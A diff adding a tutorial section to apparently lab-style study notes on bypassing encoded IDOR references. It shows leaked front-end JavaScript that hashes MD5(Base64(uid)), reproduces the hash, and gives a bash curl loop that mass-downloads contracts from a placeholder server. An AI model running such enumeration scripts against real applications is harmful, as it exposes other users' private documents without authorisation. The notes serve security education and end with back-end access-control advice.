@@ -423,3 +423,75 @@ done
 * **Custom scripts**: Bash, Python, or PowerShell can be used to automate enumeration and downloads.
 
 ---
+
+# Bypassing Encoded References
+
+## Overview
+- Some web applications use **encoded or hashed references** to make IDOR exploitation harder.
+- Common formats: Base64, MD5, SHA1, etc.
+- If encoding/hashing logic is exposed in front-end JavaScript, attackers can reverse it.
+
+## Example Scenario
+- Web app uses a POST request to download contracts:
+  ```http
+  POST /download.php
+  contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
+  ```
+
+* Appears to be MD5 hash, not clear text reference.
+
+## Function Disclosure via Front-End JavaScript
+
+* JavaScript function `downloadContract(uid)` found in source:
+
+  ```javascript
+  function downloadContract(uid) {
+      $.redirect("/download.php", {
+          contract: CryptoJS.MD5(btoa(uid)).toString()
+      }, "POST", "_self");
+  }
+  ```
+* Logic: `Base64(uid)` → MD5 hash → sent as `contract` parameter
+
+## Hash Reversal (Local Testing)
+
+```bash
+# Generate the encoded hash for uid=1
+echo -n 1 | base64 -w 0 | md5sum | tr -d ' -'
+# Output: cdd96d3cc73d1dbdaffa03cc6cd7339b
+```
+
+* Confirms that the hash is derived from Base64(uid)
+
+## Exploiting for Mass Enumeration
+
+* Goal: Download all contracts from `uid=1` to `uid=10`
+
+### Bash Script Example
+
+```bash
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+```
+
+### Output Example
+
+```bash
+contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
+contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
+```
+
+## Key Takeaways
+
+* Encoded/hashing mechanisms don’t secure references if:
+
+  * Encoding logic is exposed in JavaScript
+  * Hashes are easily replicable (e.g., `md5(base64(uid))`)
+* Always validate access on the **back-end** based on the user session, not just on request parameters.
+
+---
